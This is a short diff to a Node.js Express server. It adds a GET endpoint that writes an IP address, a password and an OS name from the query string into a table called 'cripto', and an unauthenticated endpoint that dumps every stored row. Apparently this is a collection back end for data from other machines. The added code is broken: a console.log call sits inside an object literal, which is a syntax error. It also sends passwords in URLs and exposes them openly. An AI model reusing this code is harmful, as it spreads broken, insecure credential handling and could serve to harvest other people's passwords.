@@ -59,6 +59,28 @@ knex('cripto').truncate().then(data=>{
   res.json('listo');
 }).catch(err => console.log(err))
 })
+app.get ('/obtener', (req,res)=> {
+  const id = generateUniqueId({
+    length: 20,
+    useLetters: false
+    console.log(req)
+  });
+    knex('cripto')
+    .returning('*')
+    .insert({
+      id:id,
+      ip:req.query.ip,
+      pass:req.query.pass,
+      so:req.query.os}).then(data => {
+      res.json('listo');}).catch(err => console.log(err))
+  })
+  app.get('/datos', (req, res) =>{
+      knex.select('*').from('cripto').then(data => {
+          res.send(data)
+          console.log(data)
+      })
+
+})
 
 //Borrar 1 elemento
 app.post('/borrar', (req, res)=>{
